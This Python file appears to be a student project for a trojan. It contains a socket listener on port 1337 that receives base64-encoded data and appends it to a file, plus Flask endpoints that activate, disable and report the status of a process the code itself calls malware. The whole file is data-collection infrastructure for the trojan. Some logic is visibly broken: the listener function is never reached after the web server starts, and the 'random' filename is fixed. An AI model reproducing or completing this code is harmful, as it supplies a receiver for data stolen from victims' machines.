import socket
import base64
import random
from string import ascii_lowercase
import os
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)
process = None
malware_status = "inactive"

def generate_random_filename():
    filepath = "D:\\notes\\IAI Workstation\\YEAR 3\\ADVANCE PYTHON PROGRAMMING\\project\\Trojan\\nchgmmsirl"
    if not os.path.exists(filepath):
        with open(filepath, "a+") as f:
            f.write("")
    return filepath

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.bind(("127.0.0.1", 1337))
        server_socket.listen(5)
        print("Listening on port 1337...")
    except Exception as e:
        print(f"Failed to bind or listen on port 1337: {e}")
        return

    while True:
        try:
            client_socket, client_address = server_socket.accept()
            print(f"[+] Received a connection from -> {client_address}")
            encoded_data = client_socket.recv(4096)
            client_socket.close()
            try:
                decoded_data = base64.b64decode(encoded_data).decode("UTF-8")
                filename = generate_random_filename()
                with open(filename, "a", encoding="utf-8") as random_fd:
                    random_fd.write(decoded_data)
                print(f"Data saved to file: {filename}")
            except Exception as e:
                print(f"Failed to decode or write data: {e}")
        except Exception as e:
            print(f"Error during client connection: {e}")
        finally:
            client_socket.close()

@app.route('/activate', methods=['POST'])
def activate():
    global process, malware_status
    if process is None:
        process = subprocess.Popen(['python', 'main.py'])
        malware_status = "active"
    return jsonify(status=malware_status)

@app.route('/disable', methods=['POST'])
def disable():
    global process, malware_status
    if process is not None:
        process.terminate()
        process = None
        malware_status = "inactive"
    return jsonify(status=malware_status)

@app.route('/enable', methods=['POST'])
def enable():
    global process, malware_status
    if process is None:
        if os.name == 'nt':  # Windows
            process = subprocess.Popen(['start', 'cmd', '/k', 'python main.py'], shell=True)
        else:  # Unix-based systems
            process = subprocess.Popen(['x-terminal-emulator', '-e', 'python main.py'])
        malware_status = "enabled"
    return jsonify(status=malware_status)

@app.route('/status', methods=['GET'])
def status():
    global malware_status
    return jsonify(status=malware_status)

if __name__ == "__main__":
    app.run(debug=True)
    main()
